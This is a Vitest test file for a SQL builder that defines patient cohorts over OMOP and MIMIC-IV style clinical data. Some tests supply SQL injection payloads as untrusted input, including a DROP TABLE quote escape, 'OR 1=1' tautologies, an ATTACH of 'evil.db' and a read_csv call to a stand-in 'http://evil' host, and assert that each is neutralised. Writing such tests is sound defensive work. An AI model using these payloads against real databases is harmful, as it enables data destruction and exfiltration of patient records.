import { describe, it, expect } from 'vitest'
import { mappingV1ToV2, type SchemaMappingV1 } from '@/lib/schema-classes/v1'
import {
  buildAttritionQueries,
  buildCohortCountSql,
  buildCohortCriteriaSql,
  buildCohortMembershipSql,
  buildCohortResultsSql,
  conceptCriterionBoundToStay,
  getNodeLabel,
  sqlComment,
  withinStaySql,
  CUSTOM_SQL_STEP_ID,
} from './cohort-query'
import type { Cohort, CohortLevel } from '@/types'
import { withClassRelations } from '@/lib/schema-classes/inject'

// The membership query freezes cohort content into a snapshot (materialization).
// It must return both the level id and a patient_id, and must NOT cap rows with
// a LIMIT — a truncated snapshot would silently lose members.

const mapping_V1: SchemaMappingV1 = {
  presetId: 'test',
  presetLabel: { en: 'Test' },
  patientTable: { table: 'person', idColumn: 'person_id' },
  visitTable: {
    table: 'visit',
    idColumn: 'visit_id',
    patientIdColumn: 'person_id',
    startDateColumn: 'start',
    endDateColumn: 'end',
  },
}
const mapping = mappingV1ToV2(mapping_V1)

/** The SQL on one line, for assertions that are about content, not layout. */
const squash = (sql: string) => sql.replace(/\s+/g, ' ')
const withoutComments = (sql: string) => sql.replace(/--[^\n]*/g, '')

function makeCohort(level: CohortLevel): Cohort {
  return {
    id: 'c1',
    projectUid: 'p1',
    name: { en: 'Test', fr: 'Test' },
    description: {},
    level,
    criteriaTree: {
      kind: 'group',
      id: 'root',
      operator: 'AND',
      children: [],
      exclude: false,
      enabled: true,
    },
    schemaVersion: 4,
    createdAt: '2026-01-01',
    updatedAt: '2026-01-01',
  }
}

describe('buildCohortMembershipSql', () => {
  it('at patient level returns id + patient_id from the same column, no LIMIT', () => {
    const sql = buildCohortMembershipSql(makeCohort('patient'), mapping)!
    expect(sql).toContain('linkr_patient.patient_id AS id')
    expect(sql).toContain('linkr_patient.patient_id AS patient_id')
    expect(sql).not.toMatch(/LIMIT/i)
  })

  it('at visit level returns the visit id but the patient FK as patient_id', () => {
    const sql = buildCohortMembershipSql(makeCohort('visit'), mapping)!
    expect(sql).toContain('linkr_visit.visit_id AS id')
    expect(sql).toContain('linkr_visit.patient_id AS patient_id')
  })

  it('returns null for event level (no single base table)', () => {
    expect(buildCohortMembershipSql(makeCohort('event'), mapping)).toBeNull()
  })
})

// A visit-level cohort whose criteria never touch the patient table still
// SELECTs gender/age through the `p` alias. Before the join was forced, DuckDB
// answered `Binder Error: Referenced table "p" not found!` — and because only
// this query (not the count) failed, the run looked like it had never happened.
describe('buildCohortResultsSql patient join', () => {
  const withPatientCols = mappingV1ToV2({
    ...mapping_V1,
    patientTable: {
      table: 'person',
      idColumn: 'person_id',
      genderColumn: 'gender_concept_id',
      birthYearColumn: 'year_of_birth',
    },
  } as never)

  it('joins the patient table whenever a p.-qualified column is selected', () => {
    const sql = buildCohortResultsSql(makeCohort('visit'), withPatientCols)!
    expect(sql).toContain('INNER JOIN linkr_patient p')
    // Every `p.` reference must be covered by that join.
    expect(sql).toContain('p.gender_source_value')
  })

  it('never emits a p. reference without the join', () => {
    for (const level of ['patient', 'visit'] as CohortLevel[]) {
      const sql = buildCohortResultsSql(makeCohort(level), withPatientCols)
      if (!sql) continue
      if (/\bp\./.test(sql)) expect(sql).toContain('INNER JOIN linkr_patient p')
    }
  })

  it('leaves the join out when the mapping exposes no patient-derived column', () => {
    const sql = buildCohortResultsSql(makeCohort('visit'), mapping)!
    expect(sql).not.toContain('INNER JOIN linkr_patient p')
    expect(sql).not.toMatch(/\bp\./)
  })
})

// MIMIC-IV maps both a birth date and a birth year, but person.birth_datetime is
// NULL for all 364k rows — preferring the date outright made age_at_admission
// NULL for every result.
describe('buildCohortResultsSql age column', () => {
  const withBoth = mappingV1ToV2({
    ...mapping_V1,
    patientTable: {
      table: 'person',
      idColumn: 'person_id',
      birthDateColumn: 'birth_datetime',
      birthYearColumn: 'year_of_birth',
    },
  } as never)

  it('falls back to the birth year per row when both are mapped', () => {
    const sql = buildCohortResultsSql(makeCohort('visit'), withBoth)!
    expect(sql).toContain('p.birth_year AS age_at_admission')
    expect(withClassRelations(sql, withBoth)).toContain(`COALESCE(DATE_PART('year', p."birth_datetime"::TIMESTAMP), p."year_of_birth") AS birth_year`)
  })

  it('emits a single expression when only one of the two is mapped', () => {
    const yearOnly = mappingV1ToV2({
      ...mapping_V1,
      patientTable: { table: 'person', idColumn: 'person_id', birthYearColumn: 'year_of_birth' },
    } as never)
    const sql = withClassRelations(buildCohortResultsSql(makeCohort('visit'), yearOnly)!, yearOnly)
    expect(sql).not.toContain('COALESCE(')
    expect(sql).toContain('p."year_of_birth" AS birth_year')
  })
})

// MIMIC-IV has neither a birth date nor a birth year, only anchor_age (the age
// in anchor_year). Unmapped, an age criterion compiled to 1=1 and kept everyone.
describe('age from the MIMIC-IV anchor pair', () => {
  const anchored = mappingV1ToV2({
    ...mapping_V1,
    patientTable: { table: 'patients', idColumn: 'subject_id', anchorAgeColumn: 'anchor_age', anchorYearColumn: 'anchor_year' },
  } as never)
  const withAge = (level: CohortLevel): Cohort => ({
    ...makeCohort(level),
    criteriaTree: {
      ...makeCohort(level).criteriaTree,
      children: [{
        kind: 'criterion', id: 'a', type: 'age', operator: 'AND', exclude: false, enabled: true,
        config: { ageReference: 'admission', min: 50 },
      }],
    },
  } as Cohort)

  it('filters on the age derived from anchor_year - anchor_age', () => {
    const sql = buildCohortCountSql(withAge('visit'), anchored)!
    expect(sql).toContain(`DATE_PART('year', linkr_visit.start_datetime::TIMESTAMP) - p.birth_year >= 50`)
    expect(withClassRelations(sql, anchored)).toContain('(p."anchor_year" - p."anchor_age") AS birth_year')
  })

  it('shows the age in the results', () => {
    const sql = buildCohortResultsSql(makeCohort('visit'), anchored)!
    expect(sql).toContain('p.birth_year AS age_at_admission')
  })
})

// Free-text search over clinical notes. The generated SQL was validated against
// a real DuckDB: `word` matches "art" but not "artere", `contains` matches both,
// and quoted input cannot escape the literal.
describe('buildCohortCountSql free-text criterion', () => {
  const withNotes_V1: SchemaMappingV1 = {
    ...mapping_V1,
    noteTable: {
      table: 'note',
      idColumn: 'note_id',
      patientIdColumn: 'person_id',
      visitIdColumn: 'visit_occurrence_id',
      dateColumn: 'note_datetime',
      titleColumn: 'note_title',
      textColumn: 'note_text',
    },
  }
  const withNotes = mappingV1ToV2(withNotes_V1)

  function textCohort(config: Record<string, unknown>): Cohort {
    const c = makeCohort('visit')
    return {
      ...c,
      criteriaTree: {
        ...c.criteriaTree,
        children: [
          {
            kind: 'criterion',
            id: 'x1',
            type: 'text',
            config,
            operator: 'AND',
            exclude: false,
            enabled: true,
          },
        ],
      },
    } as unknown as Cohort
  }

  it('stays descriptive (no filter) when no terms are given', () => {
    const sql = buildCohortCountSql(textCohort({ description: 'just a note' }), withNotes)!
    expect(sql).not.toContain('note')
    expect(sql).not.toMatch(/WHERE/)
  })

  it('matches whole words with a \\b boundary, not \\y', () => {
    const sql = buildCohortCountSql(
      textCohort({ description: '', searches: [{ field: 'text', terms: ['art'], mode: 'word' }] }),
      withNotes,
    )!
    expect(sql).toContain('\\bart\\b')
    // \y is the Postgres spelling; DuckDB rejects it at runtime.
    expect(sql).not.toContain('\\y')
  })

  it('does not double the regex backslashes (escSql would break \\b)', () => {
    const sql = buildCohortCountSql(
      textCohort({ description: '', searches: [{ field: 'text', terms: ['art'], mode: 'word' }] }),
      withNotes,
    )!
    expect(sql).not.toContain('\\\\b')
  })

  it('ANDs a title search with a body search inside one criterion', () => {
    const sql = buildCohortCountSql(
      textCohort({
        description: '',
        searches: [
          { field: 'title', terms: ['compte rendu'] },
          { field: 'text', terms: ['heparine'] },
        ],
      }),
      withNotes,
    )!
    expect(sql).toContain('n.title ILIKE')
    expect(sql).toContain('n.text ILIKE')
    expect(sql).toMatch(/EXISTS \(\s*SELECT 1\s*FROM linkr_note n/)
  })

  it('ORs several terms by default and ANDs them when asked', () => {
    const or = buildCohortCountSql(
      textCohort({ description: '', searches: [{ field: 'text', terms: ['a', 'b'] }] }),
      withNotes,
    )!
    expect(or).toMatch(/ILIKE[^)]*OR/)
    const and = buildCohortCountSql(
      textCohort({
        description: '',
        searches: [{ field: 'text', terms: ['a', 'b'], anyTerm: false }],
      }),
      withNotes,
    )!
    expect(and).toMatch(/ILIKE[^)]*AND/)
  })

  it('neutralizes a quote-escape attempt in a term', () => {
    const sql = buildCohortCountSql(
      textCohort({
        description: '',
        searches: [{ field: 'text', terms: ["x'); DROP TABLE note;--"] }],
      }),
      withNotes,
    )!
    // The quote is doubled, so the payload stays inside the string literal.
    expect(sql).toContain("x''); DROP")
    // What must not appear is a SINGLE quote closing the literal early — i.e.
    // an odd number of quotes before the payload.
    // The criterion's comment names the term too; a comment is not SQL.
    expect(withoutComments(sql)).not.toMatch(/[^']'\); DROP/)
  })

  it('treats LIKE wildcards in a term as literal characters', () => {
    const sql = buildCohortCountSql(
      textCohort({ description: '', searches: [{ field: 'text', terms: ['100%'] }] }),
      withNotes,
    )!
    expect(sql).toContain('100\\%')
    expect(sql).toContain("ESCAPE '\\'")
  })

  it('negates a search with NOT when excluded', () => {
    const sql = buildCohortCountSql(
      textCohort({
        description: '',
        searches: [{ field: 'text', terms: ['heparin'], exclude: true }],
      }),
      withNotes,
    )!
    expect(sql).toMatch(/NOT \(/)
  })

  it('joins searches with AND > OR precedence, like the criteria tree', () => {
    const sql = buildCohortCountSql(
      textCohort({
        description: '',
        searches: [
          { field: 'text', terms: ['a'] },
          { field: 'text', terms: ['b'], operator: 'OR' },
          { field: 'text', terms: ['c'], operator: 'AND' },
        ],
      }),
      withNotes,
    )!
    // a OR (b AND c) — the OR splits the groups, the AND binds inside one.
    expect(sql).toContain('OR')
    expect(sql).toContain('AND')
    // The note link must stay ANDed with the whole disjunction, never absorbed
    // into one branch of it (which would match unrelated patients' notes).
    expect(sql).toMatch(/n\.patient_id = linkr_visit\.patient_id\s+AND .*\(/s)
  })

  it('drops a title search when the mapping has no title column', () => {
    const noTitle = mappingV1ToV2({
      ...withNotes_V1,
      noteTable: { ...withNotes_V1.noteTable, titleColumn: undefined },
    } as never)
    const sql = buildCohortCountSql(
      textCohort({ description: '', searches: [{ field: 'title', terms: ['x'] }] }),
      noTitle,
    )!
    // Silently widening to every note would be worse than ignoring the search.
    expect(sql).not.toContain('EXISTS')
  })
})

// A cohort's criteria are not developer-authored: importProjectZip JSON.parses
// cohorts/*.json straight into storage with no schema validation, so every
// field below can arrive from a shared ZIP or a cloned repo carrying whatever
// the author put there. The forms coerce and constrain; import does not.
describe('criteria from an untrusted cohort JSON', () => {
  const eventMapping = mappingV1ToV2({
    ...mapping_V1,
    eventTables: {
      Measurement: {
        table: 'measurement',
        conceptIdColumn: 'measurement_concept_id',
        patientIdColumn: 'person_id',
        valueColumn: 'value_as_number',
        dateColumn: 'measurement_date',
      },
    },
  } as never)

  function conceptCohort(config: unknown): Cohort {
    const c = makeCohort('patient')
    c.criteriaTree.children = [
      { kind: 'criterion', id: 'x', type: 'concept', enabled: true, operator: 'AND', exclude: false, config },
    ] as never
    return c
  }

  function durationCohort(config: unknown): Cohort {
    const c = makeCohort('visit')
    c.criteriaTree.children = [
      { kind: 'criterion', id: 'x', type: 'duration', enabled: true, operator: 'AND', exclude: false, config },
    ] as never
    return c
  }

  it('drops an occurrence count that is not a number', () => {
    // Unguarded this closed the HAVING and appended a UNION ALL ... read_csv(),
    // i.e. an outbound-egress channel out of a "cohort definition".
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        occurrenceCount: { operator: '>=', count: "1 UNION ALL SELECT 1 FROM read_csv('http://evil/x')" },
      }),
      eventMapping,
    )!
    expect(sql).not.toContain('read_csv')
    expect(sql).not.toContain('UNION ALL')
  })

  it('drops an occurrence operator outside the declared union', () => {
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        occurrenceCount: { operator: '>= 0 OR 1=1 --', count: 2 },
      }),
      eventMapping,
    )!
    expect(sql).not.toContain('OR 1=1')
  })

  it('drops a value filter whose bound is not a number', () => {
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        valueFilters: [{ operator: '>', value: '0 OR 1=1' }],
      }),
      eventMapping,
    )!
    expect(sql).not.toContain('OR 1=1')
  })

  it('drops a value filter whose operator is not a comparison', () => {
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        valueFilters: [{ operator: 'IS NOT NULL OR 1=1 --', value: 0 }],
      }),
      eventMapping,
    )!
    expect(sql).not.toContain('OR 1=1')
  })

  it('drops a legacy single value filter that is not numeric', () => {
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        valueFilter: { operator: '>', value: '1; ATTACH \'evil.db\' AS e' },
      }),
      eventMapping,
    )!
    expect(sql).not.toContain('ATTACH')
  })

  it('drops non-numeric duration bounds', () => {
    const sql = buildCohortCountSql(
      durationCohort({ durationLevel: 'visit', durationUnit: 'days', minDays: '0 OR 1=1' }),
      eventMapping,
    )!
    expect(sql).not.toContain('OR 1=1')
  })

  it('still emits the filters when the values are legitimate', () => {
    const sql = buildCohortCountSql(
      conceptCohort({
        eventTableLabel: 'Measurement',
        conceptIds: [1],
        valueFilters: [{ operator: '>=', value: 3 }, { operator: 'between', value: 1, value2: 9 }],
        occurrenceCount: { operator: '>=', count: 2 },
      }),
      eventMapping,
    )!
    expect(sql).toContain('e.value_number >= 3')
    expect(sql).toContain('BETWEEN 1 AND 9')
    expect(sql).toContain('HAVING COUNT(*) >= 2')
  })

  it('keeps a valid duration range', () => {
    const sql = buildCohortCountSql(
      durationCohort({ durationLevel: 'visit', durationUnit: 'days', minDays: 2, maxDays: 10 }),
      eventMapping,
    )!
    expect(squash(sql)).toMatch(/DATE_DIFF\('day'[^)]*\) >= 2 AND DATE_DIFF\('day'[^)]*\) <= 10/)
  })
})

// An attrition step is labelled from the criterion that produced it. A sex
// criterion stores gender CONCEPT IDS, and which id means what belongs to the
// mapping — so the label must resolve them, or the chart reads "Sex: 8532".
describe('getNodeLabel — sex', () => {
  const omop = mappingV1ToV2({ genderValues: { male: '8507', female: '8532', unknown: '0' } } as never)
  const node = (values: string[], exclude = false) =>
    ({ kind: 'criterion', type: 'sex', config: { values }, exclude }) as unknown as Parameters<typeof getNodeLabel>[0]

  it('names the concept ids the picker offered', () => {
    expect(getNodeLabel(node(['8532']), omop)).toBe('Sex: Female')
    expect(getNodeLabel(node(['8507']), omop)).toBe('Sex: Male')
    expect(getNodeLabel(node(['0']), omop)).toBe('Sex: Unknown')
  })

  it('keeps every selected value, in order', () => {
    expect(getNodeLabel(node(['8507', '8532']), omop)).toBe('Sex: Male, Female')
  })

  it('resolves against the mapping, not a hard-coded OMOP table', () => {
    // MIMIC stores letters, eHOP digits: the same id means different things.
    const mimic = mappingV1ToV2({ genderValues: { male: 'M', female: 'F' } } as never)
    expect(getNodeLabel(node(['F']), mimic)).toBe('Sex: Female')
    // 8532 is not a gender value here, so it is left as-is rather than mislabelled.
    expect(getNodeLabel(node(['8532']), mimic)).toBe('Sex: 8532')
  })

  it('falls back to the raw value with no mapping', () => {
    expect(getNodeLabel(node(['8532']))).toBe('Sex: 8532')
  })

  it('keeps the exclusion prefix', () => {
    expect(getNodeLabel(node(['8532'], true), omop)).toBe('NOT Sex: Female')
  })
})

// A stay-level cohort must tie each event to the stay being selected, not only
// to its patient: "stays with a lactate > 2" kept every stay of anyone who ever
// had one. The exact day/time semantics are checked against DuckDB by hand
// (timestamp vs DATE bounds, open end); here we pin where the window goes.
describe('concept criteria bound to the stay', () => {
  const stayMapping = mappingV1ToV2({
    ...mapping_V1,
    visitDetailTable: {
      table: 'icu', idColumn: 'stay_id', visitIdColumn: 'visit_id', patientIdColumn: 'person_id',
      startDateColumn: 'intime', endDateColumn: 'outtime',
    },
    eventTables: {
      Lab: { table: 'lab', conceptIdColumn: 'itemid', patientIdColumn: 'person_id', dateColumn: 'charttime' },
      Undated: { table: 'undated', conceptIdColumn: 'itemid', patientIdColumn: 'person_id' },
    },
  } as never)

  function cohortOn(level: CohortLevel, eventTableLabel: string, extra: object = {}): Cohort {
    const c = makeCohort(level)
    c.criteriaTree.children = [{
      kind: 'criterion', id: 'x', type: 'concept', enabled: true, operator: 'AND', exclude: false,
      config: { eventTableLabel, conceptIds: [50813], conceptNames: {}, ...extra },
    }] as never
    return c
  }

  it('compares the event date with the visit bounds at visit level', () => {
    const sql = buildCohortCountSql(cohortOn('visit', 'Lab'), stayMapping)!
    expect(squash(sql)).toContain(squash(withinStaySql('e.start_datetime', 'linkr_visit.start_datetime', 'linkr_visit.end_datetime')))
  })

  it('uses the unit stay bounds at visit_detail level, occurrence counts included', () => {
    const sql = buildCohortCountSql(
      cohortOn('visit_detail', 'Lab', { occurrenceCount: { operator: '>=', count: 2 } }), stayMapping)!
    expect(squash(sql)).toContain(squash(withinStaySql('e.start_datetime', 'linkr_visit_detail.start_datetime', 'linkr_visit_detail.end_datetime')))
    expect(sql).toContain('HAVING COUNT(*) >= 2')
  })

  it('adds no window at patient level, nor when the event table has no date', () => {
    expect(buildCohortCountSql(cohortOn('patient', 'Lab'), stayMapping)).not.toContain('CAST(e.start_datetime')
    expect(buildCohortCountSql(cohortOn('visit', 'Undated'), stayMapping)).not.toContain('AS TIMESTAMP')
    expect(conceptCriterionBoundToStay('visit', stayMapping, 'Undated')).toBe(false)
    expect(conceptCriterionBoundToStay('visit', stayMapping, 'Lab')).toBe(true)
    expect(conceptCriterionBoundToStay('patient', stayMapping, 'Undated')).toBe(true)
  })

  it('leaves an open end when the stay has no end column', () => {
    expect(withinStaySql('e.d', 's', null)).not.toContain('<=')
  })
})

// The SQL tab's query is the cohort's MEMBERSHIP (an `id` column), not its
// count: every other query wraps it, so an edit reaches the count, the results,
// the freeze and the derivation alike. It used to replace the count only, and
// freezing silently fell back to the criteria.
describe('hand-written membership query', () => {
  const vdMapping = mappingV1ToV2({
    ...mapping_V1,
    visitDetailTable: {
      table: 'icu', idColumn: 'stay_id', visitIdColumn: 'visit_id', patientIdColumn: 'person_id',
      startDateColumn: 'intime', endDateColumn: 'outtime',
    },
  } as never)
  const custom = (customSql: string, level: CohortLevel = 'visit_detail'): Cohort => ({ ...makeCohort(level), customSql })
  const SQL = 'SELECT visit_detail_id AS id FROM linkr_visit_detail WHERE visit_detail_id IN (101, 205)'

  it('filters every query of the cohort on it', () => {
    const c = custom(SQL)
    for (const sql of [
      buildCohortCountSql(c, vdMapping)!,
      buildCohortResultsSql(c, vdMapping)!,
      buildCohortMembershipSql(c, vdMapping)!,
    ]) {
      expect(squash(sql)).toContain(`linkr_visit_detail.visit_detail_id IN ( SELECT id FROM ( ${SQL} ) AS custom_members )`)
    }
  })

  it('still returns id and patient_id for the freeze and the derivation', () => {
    const sql = buildCohortMembershipSql(custom(SQL), vdMapping)!
    expect(sql).toContain('linkr_visit_detail.visit_detail_id AS id')
    expect(sql).toContain('linkr_visit_detail.patient_id AS patient_id')
  })

  it('survives a final semicolon and a trailing comment', () => {
    const sql = buildCohortCountSql(custom(`${SQL} -- the two stays;\n;`), vdMapping)!
    expect(withoutComments(sql)).not.toMatch(/;/)
    // The comment ends its line; the closing parentheses are on lines of their own.
    expect(sql).toMatch(/-- the two stays;\s*\n\s*\) AS custom_members/)
  })

  it('never re-indents a line inside one of its string literals', () => {
    const sql = buildCohortCountSql(custom("SELECT 1 AS id WHERE 'a\nb' <> ''"), vdMapping)!
    expect(sql).toContain("'a\nb'")
  })

  it('gives attrition a single step, and the SQL tab the criteria query to start from', () => {
    const steps = buildAttritionQueries(custom(SQL), vdMapping)
    expect(steps.map((s) => s.nodeId)).toEqual(['__total__', CUSTOM_SQL_STEP_ID])
    const generated = buildCohortCriteriaSql(custom(SQL), vdMapping)!
    expect(generated).not.toContain('custom_members')
    expect(generated).toContain('AS id')
  })

  it('cannot define an event-level cohort', () => {
    expect(buildCohortCountSql(custom(SQL, 'event'), vdMapping)).toBeNull()
  })
})

describe('identifier list criterion', () => {
  const vdMapping = mappingV1ToV2({
    ...mapping_V1,
    visitDetailTable: {
      table: 'icu', idColumn: 'stay_id', visitIdColumn: 'visit_id', patientIdColumn: 'person_id',
      startDateColumn: 'intime', endDateColumn: 'outtime',
    },
  } as never)
  function idCohort(level: CohortLevel, config: unknown, exclude = false): Cohort {
    const c = makeCohort(level)
    c.criteriaTree.children = [
      { kind: 'criterion', id: 'x', type: 'id_list', enabled: true, operator: 'AND', exclude, config },
    ] as never
    return c
  }

  it('matches the level\'s own id as text', () => {
    const sql = buildCohortCountSql(idCohort('visit_detail', { idLevel: 'visit_detail', ids: ['101', '205'] }), vdMapping)!
    expect(sql).toContain("CAST(linkr_visit_detail.visit_detail_id AS VARCHAR) IN ('101', '205')")
  })

  it('matches patient ids on the row\'s own patient_id at any level', () => {
    const sql = buildCohortCountSql(idCohort('visit', { idLevel: 'patient', ids: ['7'] }), vdMapping)!
    expect(sql).toContain("CAST(linkr_visit.patient_id AS VARCHAR) IN ('7')")
  })

  it('keeps the unit stays of listed stays, and the patients of listed unit stays', () => {
    const vd = squash(buildCohortCountSql(idCohort('visit_detail', { idLevel: 'visit', ids: ['12'] }), vdMapping)!)
    expect(vd).toContain('FROM linkr_visit WHERE linkr_visit.visit_id = linkr_visit_detail.visit_id')
    expect(vd).toContain("CAST(linkr_visit.visit_id AS VARCHAR) IN ('12')")
    const patient = squash(buildCohortCountSql(idCohort('patient', { idLevel: 'visit_detail', ids: ['101'] }), vdMapping)!)
    expect(patient).toContain('FROM linkr_visit_detail WHERE linkr_visit_detail.patient_id = linkr_patient.patient_id')
  })

  it('trims, deduplicates and escapes the ids an imported file holds', () => {
    const sql = buildCohortCountSql(
      idCohort('visit', { idLevel: 'visit', ids: [' 1 ', '1', "x') OR 1=1 --", '', null, { a: 1 }, 2] }), vdMapping)!
    expect(sql).toContain("IN ('1', 'x'') OR 1=1 --', '2')")
  })

  it('selects everyone while the list is empty, like any incomplete criterion', () => {
    expect(buildCohortCountSql(idCohort('visit', { idLevel: 'visit', ids: [] }), vdMapping)).not.toContain('WHERE')
  })

  it('negates the list when excluded', () => {
    const sql = buildCohortCountSql(idCohort('visit', { idLevel: 'visit', ids: ['1'] }, true), vdMapping)!
    expect(sql).toContain("NOT (CAST(linkr_visit.visit_id AS VARCHAR) IN ('1'))")
  })
})

describe('text criterion: case and accents', () => {
  const noteMapping = mappingV1ToV2({
    ...mapping_V1,
    noteTable: { table: 'note', idColumn: 'note_id', patientIdColumn: 'person_id', dateColumn: 'd', textColumn: 't' },
  } as never)
  const textSql = (search: Record<string, unknown>) => {
    const c = makeCohort('patient')
    c.criteriaTree.children = [{
      kind: 'criterion', id: 'x', type: 'text', enabled: true, operator: 'AND', exclude: false,
      config: { description: '', searches: [{ field: 'text', terms: ['Hémorragie'], ...search }] },
    }] as never
    return buildCohortCountSql(c, noteMapping)!
  }

  it('ignores case by default, in every mode', () => {
    expect(textSql({})).toContain("n.text ILIKE '%Hémorragie%'")
    expect(textSql({ mode: 'word' })).toContain("'(?i)")
    expect(textSql({ mode: 'regex' })).toContain("'(?i)Hémorragie'")
  })

  it('matches the case as typed when asked', () => {
    expect(textSql({ caseSensitive: true })).toContain("n.text LIKE '%Hémorragie%'")
    expect(textSql({ caseSensitive: true, mode: 'regex' })).toContain("'Hémorragie'")
    expect(textSql({ caseSensitive: true, mode: 'regex' })).not.toContain('(?i)')
  })

  it('strips accents on both sides when asked', () => {
    expect(textSql({ ignoreAccents: true })).toContain("strip_accents(n.text) ILIKE '%Hemorragie%'")
  })
})

describe('layout of the generated SQL', () => {
  const tree = (children: unknown[]): Cohort => {
    const c = makeCohort('patient')
    c.criteriaTree.children = children as never
    return c
  }
  const sex = (values: string[], operator = 'AND') =>
    ({ kind: 'criterion', id: values.join(), type: 'sex', enabled: true, operator, exclude: false, config: { values } })
  const sexMapping = mappingV1ToV2({ ...mapping_V1, patientTable: { ...mapping_V1.patientTable, genderColumn: 'sex' } } as never)

  it('names each criterion in a comment above it', () => {
    const sql = buildCohortCountSql(tree([sex(['M']), sex(['F'])]), sexMapping)!
    expect(sql).toMatch(/-- Sex: M\n\s*linkr_patient\.gender_source_value IN \('M'\)/)
    expect(sql).toMatch(/AND -- Sex: F\n/)
  })

  it('wraps an OR group joined by AND, and nothing else', () => {
    const group = { kind: 'group', id: 'g', operator: 'AND', exclude: false, enabled: true, children: [sex(['F']), sex(['X'], 'OR')] }
    const sql = squash(buildCohortCountSql(tree([sex(['M']), group]), sexMapping)!)
    expect(sql).toMatch(/AND \( -- Sex: F linkr_patient\.gender_source_value IN \('F'\) OR -- Sex: X .* \)/)
    expect(sql).not.toMatch(/\(\s*linkr_patient\.gender_source_value IN \('M'\)/)
  })

  it('keeps a label from breaking out of its comment', () => {
    expect(sqlComment('Adults\nOR 1=1 --')).toBe('-- Adults OR 1=1 --')
    const group = { kind: 'group', id: 'g', label: 'x\r\nOR 1=1', operator: 'AND', exclude: false, enabled: true, children: [sex(['F'])] }
    const sql = buildCohortCountSql(tree([sex(['M']), group]), sexMapping)!
    expect(sql).not.toMatch(/\n\s*OR 1=1/)
  })

  it('writes no comment for a criterion whose imported config it cannot name', () => {
    const broken = { kind: 'criterion', id: 'b', type: 'care_site', enabled: true, operator: 'AND', exclude: false, config: { careSiteLevel: 'visit', values: 'x' } }
    expect(() => buildCohortCountSql(tree([sex(['M']), broken]), sexMapping)).not.toThrow()
  })
})
